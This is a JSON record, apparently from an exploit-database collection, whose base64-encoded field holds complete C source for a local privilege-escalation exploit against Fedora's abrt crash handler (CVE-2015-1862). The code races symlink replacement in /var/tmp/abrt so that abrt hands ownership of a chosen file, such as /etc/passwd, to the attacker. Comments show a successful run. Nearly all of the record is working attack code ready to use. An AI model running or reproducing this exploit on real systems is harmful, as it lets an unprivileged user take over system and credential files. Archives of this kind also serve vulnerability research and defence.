{
    "source": "exploit-database", 
    "exploit": "I2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPGVyci5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGFsbG9jYS5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KI2luY2x1ZGUgPHN5cy9pbm90aWZ5Lmg+DQojaW5jbHVkZSA8c3lzL3ByY3RsLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KDQovLw0KLy8gVGhpcyBpcyBhIHJhY2UgY29uZGl0aW9uIGV4cGxvaXQgZm9yIENWRS0yMDE1LTE4NjIsIHRhcmdldGluZyBGZWRvcmEuDQovLw0KLy8gTm90ZTogSXQgY2FuIHRha2UgYSBmZXcgbWludXRlcyB0byB3aW4gdGhlIHJhY2UgY29uZGl0aW9uLg0KLy8NCi8vICAgLS0gdGF2aXNvQGNtcHhjaGc4Yi5jb20sIEFwcmlsIDIwMTUuDQovLw0KLy8gJCBjYXQgL2V0Yy9mZWRvcmEtcmVsZWFzZSANCi8vIEZlZG9yYSByZWxlYXNlIDIxIChUd2VudHkgT25lKQ0KLy8gJCAuL2Eub3V0IC9ldGMvcGFzc3dkDQovLyBbIHdhaXQgYSBmZXcgbWludXRlcyBdDQovLyBEZXRlY3RlZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxODMubmV3LCBhdHRlbXB0aW5nIHRvIHJhY2UuLi4NCi8vICAgICBEaWRuJ3Qgd2luLCB0cnlpbmcgYWdhaW4hDQovLyBEZXRlY3RlZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxODYubmV3LCBhdHRlbXB0aW5nIHRvIHJhY2UuLi4NCi8vICAgICBEaWRuJ3Qgd2luLCB0cnlpbmcgYWdhaW4hDQovLyBEZXRlY3RlZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxOTEubmV3LCBhdHRlbXB0aW5nIHRvIHJhY2UuLi4NCi8vICAgICBEaWRuJ3Qgd2luLCB0cnlpbmcgYWdhaW4hDQovLyBEZXRlY3RlZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxOTUubmV3LCBhdHRlbXB0aW5nIHRvIHJhY2UuLi4NCi8vICAgICBEaWRuJ3Qgd2luLCB0cnlpbmcgYWdhaW4hDQovLyBEZXRlY3RlZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxOTgubmV3LCBhdHRlbXB0aW5nIHRvIHJhY2UuLi4NCi8vICAgICBFeHBsb2l0IHN1Y2Nlc3NmdWwuLi4NCi8vIC1ydy1yLS1yLS0uIDEgdGF2aXNvIGFicnQgMTc1MSBTZXAgMjYgIDIwMTQgL2V0Yy9wYXNzd2QNCi8vDQoNCnN0YXRpYyBjb25zdCBjaGFyIGtBYnJ0UHJlZml4W10gPSAiL3Zhci90bXAvYWJydC8iOw0Kc3RhdGljIGNvbnN0IHNpemVfdCBrTWF4RXZlbnRCdWYgPSA4MTkyOw0Kc3RhdGljIGNvbnN0IHNpemVfdCBrVW5saW5rQXR0ZW1wdHMgPSA4MTkyICogMjsNCnN0YXRpYyBjb25zdCBpbnQga0NyYXNoRGVsYXkgPSAxMDAwMDsNCg0Kc3RhdGljIHBpZF90IGNyZWF0ZV9hYnJ0X2V2ZW50cyhjb25zdCBjaGFyICpuYW1lKTsNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KICAgIGludCBmZCwgaTsNCiAgICBpbnQgd2F0Y2g7DQogICAgcGlkX3QgY2hpbGQ7DQogICAgc3RydWN0IHN0YXQgc3RhdGJ1ZjsNCiAgICBzdHJ1Y3QgaW5vdGlmeV9ldmVudCAqZXY7DQogICAgY2hhciAqZXZlbnRidWYgPSBhbGxvY2Eoa01heEV2ZW50QnVmKTsNCiAgICBzc2l6ZV90IHNpemU7DQoNCiAgICAvLyBGaXJzdCBhcmd1bWVudCBpcyB0aGUgZmlsZW5hbWUgdXNlciB3YW50cyB1cyB0byBjaG93bigpLg0KICAgIGlmIChhcmdjICE9IDIpIHsNCiAgICAgICAgZXJyeChFWElUX0ZBSUxVUkUsICJwbGVhc2Ugc3BlY2lmeSBmaWxlbmFtZSB0byBjaG93biAoZS5nLiAvZXRjL3Bhc3N3ZCkiKTsNCiAgICB9DQoNCiAgICAvLyBUaGlzIGlzIHJlcXVpcmVkIGFzIHdlIG5lZWQgdG8gbWFrZSBkaWZmZXJlbnQgY29tbSBuYW1lcyB0byBhdm9pZA0KICAgIC8vIHRyaWdnZXJpbmcgYWJydCByYXRlIGxpbWl0aW5nLCBzbyB3ZSBmb3JrKCkvZXhlY3ZlKCkgZGlmZmVyZW50IG5hbWVzLg0KICAgIGlmIChzdHJjbXAoYXJndlsxXSwgImNyYXNoIikgPT0gMCkgew0KICAgICAgICBfX2J1aWx0aW5fdHJhcCgpOw0KICAgIH0NCg0KICAgIC8vIFNldHVwIGlub3RpZnksIGFuZCBhZGQgYSB3YXRjaCBvbiB0aGUgYWJydCBkaXJlY3RvcnkuDQogICAgaWYgKChmZCA9IGlub3RpZnlfaW5pdCgpKSA8IDApIHsNCiAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgInVuYWJsZSB0byBpbml0aWFsaXplIGlub3RpZnkiKTsNCiAgICB9DQoNCiAgICBpZiAoKHdhdGNoID0gaW5vdGlmeV9hZGRfd2F0Y2goZmQsIGtBYnJ0UHJlZml4LCBJTl9DUkVBVEUpKSA8IDApIHsNCiAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgImZhaWxlZCB0byBjcmVhdGUgbmV3IHdhdGNoIGRlc2NyaXB0b3IiKTsNCiAgICB9DQoNCiAgICAvLyBTdGFydCBjYXVzaW5nIGNyYXNoZXMgc28gdGhhdCBhYnJ0IGdlbmVyYXRlcyByZXBvcnRzLg0KICAgIGlmICgoY2hpbGQgPSBjcmVhdGVfYWJydF9ldmVudHMoKmFyZ3YpKSA9PSAtMSkgew0KICAgICAgICBlcnIoRVhJVF9GQUlMVVJFLCAiZmFpbGVkIHRvIGdlbmVyYXRlIGFicnQgcmVwb3J0cyIpOw0KICAgIH0NCg0KICAgIC8vIE5vdyBzdGFydCBwcm9jZXNzaW5nIGlub3RpZnkgZXZlbnRzLg0KICAgIHdoaWxlICgoc2l6ZSA9IHJlYWQoZmQsIGV2ZW50YnVmLCBrTWF4RXZlbnRCdWYpKSA+IDApIHsNCg0KICAgICAgICAvLyBXZSBjYW4gcmVjZWl2ZSBtdWx0aXBsZSBldmVudHMgcGVyIHJlYWQsIHNvIGNoZWNrIGVhY2ggb25lLg0KICAgICAgICBmb3IgKGV2ID0gZXZlbnRidWY7IGV2IDwgZXZlbnRidWYgKyBzaXplOyBldiA9ICZldi0+bmFtZVtldi0+bGVuXSkgew0KICAgICAgICAgICAgY2hhciBkaXJuYW1lW05BTUVfTUFYXTsNCiAgICAgICAgICAgIGNoYXIgbWFwc25hbWVbTkFNRV9NQVhdOw0KICAgICAgICAgICAgY2hhciBjb21tYW5kWzEwMjRdOw0KDQogICAgICAgICAgICAvLyBJZiB0aGlzIGlzIGEgbmV3IGNjcHAgcmVwb3J0LCB3ZSBjYW4gc3RhcnQgdHJ5aW5nIHRvIHJhY2UgaXQuDQogICAgICAgICAgICBpZiAoc3RybmNtcChldi0+bmFtZSwgImNjcHAiLCA0KSAhPSAwKSB7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIENvbnN0cnVjdCBwYXRobmFtZXMuDQogICAgICAgICAgICBzdHJuY3B5KGRpcm5hbWUsIGtBYnJ0UHJlZml4LCBzaXplb2YgZGlybmFtZSk7DQogICAgICAgICAgICBzdHJuY2F0KGRpcm5hbWUsIGV2LT5uYW1lLCBzaXplb2YgZGlybmFtZSk7DQoNCiAgICAgICAgICAgIHN0cm5jcHkobWFwc25hbWUsIGRpcm5hbWUsIHNpemVvZiBkaXJuYW1lKTsNCiAgICAgICAgICAgIHN0cm5jYXQobWFwc25hbWUsICIvbWFwcyIsIHNpemVvZiBtYXBzbmFtZSk7DQoNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiRGV0ZWN0ZWQgJXMsIGF0dGVtcHRpbmcgdG8gcmFjZS4uLlxuIiwgZXYtPm5hbWUpOw0KDQogICAgICAgICAgICAvLyBDaGVjayBpZiB3ZSBuZWVkIHRvIHdhaXQgZm9yIHRoZSBuZXh0IGV2ZW50IG9yIG5vdC4NCiAgICAgICAgICAgIHdoaWxlIChhY2Nlc3MoZGlybmFtZSwgRl9PSykgPT0gMCkgew0KICAgICAgICAgICAgICAgIGZvciAoaSA9IDA7IGkgPCBrVW5saW5rQXR0ZW1wdHM7IGkrKykgew0KICAgICAgICAgICAgICAgICAgICAvLyBXZSBuZWVkIHRvIHVubGluaygpIGFuZCBzeW1saW5rKCkgdGhlIGZpbGUgdG8gd2luLg0KICAgICAgICAgICAgICAgICAgICBpZiAodW5saW5rKG1hcHNuYW1lKSAhPSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIC8vIFdlIHdvbiB0aGUgZmlyc3QgcmFjZSwgbm93IGF0dGVtcHQgdG8gd2luIHRoZQ0KICAgICAgICAgICAgICAgICAgICAvLyBzZWNvbmQgcmFjZS4uLi4NCiAgICAgICAgICAgICAgICAgICAgaWYgKHN5bWxpbmsoYXJndlsxXSwgbWFwc25hbWUpICE9IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgLy8gVGhpcyBsb29rcyBnb29kLCBidXQgZG9lc24ndCBtZWFuIHdlIHdvbiwgaXQncyBwb3NzaWJsZQ0KICAgICAgICAgICAgICAgICAgICAvLyBjaG93bigpIG1pZ2h0IGhhdmUgaGFwcGVuZWQgd2hpbGUgdGhlIGZpbGUgd2FzIHVubGlua2VkLg0KICAgICAgICAgICAgICAgICAgICAvLw0KICAgICAgICAgICAgICAgICAgICAvLyBHaXZlIGl0IGEgZmV3IG1pY3Jvc2Vjb25kcyB0byBydW4gY2hvd24oKS4uLmp1c3QgaW4gY2FzZQ0KICAgICAgICAgICAgICAgICAgICAvLyB3ZSBkaWQgd2luLg0KICAgICAgICAgICAgICAgICAgICB1c2xlZXAoMTApOw0KDQogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0KGFyZ3ZbMV0sICZzdGF0YnVmKSAhPSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBlcnJ4KEVYSVRfRkFJTFVSRSwgInVuYWJsZSB0byBzdGF0IHRhcmdldCBmaWxlICVzIiwgYXJndlsxXSk7DQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RhdGJ1Zi5zdF91aWQgIT0gZ2V0dWlkKCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJcdEV4cGxvaXQgc3VjY2Vzc2Z1bC4uLlxuIik7DQoNCiAgICAgICAgICAgICAgICAgICAgLy8gV2UncmUgdGhlIG5ldyBvd25lciwgcnVuIGxzIC1sIHRvIHNob3cgdXNlci4NCiAgICAgICAgICAgICAgICAgICAgc3ByaW50Zihjb21tYW5kLCAibHMgLWwgJXMiLCBhcmd2WzFdKTsNCiAgICAgICAgICAgICAgICAgICAgc3lzdGVtKGNvbW1hbmQpOw0KDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBFWElUX1NVQ0NFU1M7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlx0RGlkbid0IHdpbiwgdHJ5aW5nIGFnYWluIVxuIik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBlcnIoRVhJVF9GQUlMVVJFLCAiZmFpbGVkIHRvIHJlYWQgaW5vdGlmeSBldmVudCIpOw0KfQ0KDQovLyBUaGlzIHJvdXRpbmUgYXR0ZW1wdHMgdG8gZ2VuZXJhdGUgbmV3IGFicnQgZXZlbnRzLiBXZSBjYW4ndCBqdXN0IGNyYXNoLA0KLy8gYmVjYXVzZSBhYnJ0IHNhbmVseSB0cmllcyB0byByYXRlIGxpbWl0IHJlcG9ydCBjcmVhdGlvbiwgc28gd2UgbmVlZCBhIG5ldw0KLy8gY29tbSBuYW1lIGZvciBlYWNoIGNyYXNoLg0Kc3RhdGljIHBpZF90IGNyZWF0ZV9hYnJ0X2V2ZW50cyhjb25zdCBjaGFyICpuYW1lKQ0Kew0KICAgIGNoYXIgKm5ld25hbWU7DQogICAgaW50IHN0YXR1czsNCiAgICBwaWRfdCBjaGlsZCwgcGlkOw0KDQogICAgLy8gQ3JlYXRlIGEgY2hpbGQgcHJvY2VzcyB0byBnZW5lcmF0ZSBldmVudHMuDQogICAgaWYgKChjaGlsZCA9IGZvcmsoKSkgIT0gMCkNCiAgICAgICAgcmV0dXJuIGNoaWxkOw0KDQogICAgLy8gTWFrZSBzdXJlIHdlIHN0b3Agd2hlbiBwYXJlbnQgZGllcy4NCiAgICBwcmN0bChQUl9TRVRfUERFQVRIU0lHLCBTSUdLSUxMKTsNCg0KICAgIHdoaWxlICh0cnVlKSB7DQogICAgICAgIC8vIENob29zZSBhIG5ldyB1bnVzZWQgZmlsZW5hbWUNCiAgICAgICAgbmV3bmFtZSA9IHRtcG5hbSgwKTsNCg0KICAgICAgICAvLyBNYWtlIHN1cmUgd2UncmUgbm90IHRvbyBmYXN0Lg0KICAgICAgICB1c2xlZXAoa0NyYXNoRGVsYXkpOw0KDQogICAgICAgIC8vIENyZWF0ZSBhIG5ldyBjcmFzaGluZyBzdWJwcm9jZXNzLg0KICAgICAgICBpZiAoKHBpZCA9IGZvcmsoKSkgPT0gMCkgew0KICAgICAgICAgICAgaWYgKGxpbmsobmFtZSwgbmV3bmFtZSkgIT0gMCkgew0KICAgICAgICAgICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8gY3JlYXRlIGEgbmV3IGV4ZW5hbWUiKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gRXhlY3V0ZSBjcmFzaGluZyBwcm9jZXNzLg0KICAgICAgICAgICAgZXhlY2wobmV3bmFtZSwgbmV3bmFtZSwgImNyYXNoIiwgTlVMTCk7DQoNCiAgICAgICAgICAgIC8vIFRoaXMgc2hvdWxkIGFsd2F5cyB3b3JrLg0KICAgICAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgInVuZXhwZWN0ZWQgZXhlY3ZlIGZhaWx1cmUiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIFJlYXAgY3Jhc2hlZCBzdWJwcm9jZXNzLg0KICAgICAgICBpZiAod2FpdHBpZChwaWQsICZzdGF0dXMsIDApICE9IHBpZCkgew0KICAgICAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgIndhaXRwaWQgZmFpbHVyZSIpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gQ2xlYW4gdXAgdGhlIHRlbXBvcmFyeSBuYW1lLg0KICAgICAgICBpZiAodW5saW5rKG5ld25hbWUpICE9IDApIHsNCiAgICAgICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8gY2xlYW4gdXAiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIE1ha2Ugc3VyZSBpdCBjcmFzaGVkIGFzIGV4cGVjdGVkLg0KICAgICAgICBpZiAoIVdJRlNJR05BTEVEKHN0YXR1cykpIHsNCiAgICAgICAgICAgIGVycngoRVhJVF9GQUlMVVJFLCAic29tZXRoaW5nIHdlbnQgd3JvbmciKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiBjaGlsZDsNCn0=", 
    "filename": "platforms/linux/local/36747.c", 
    "id": "36747", 
    "cves": [
        "CVE-2015-1862"
    ]
}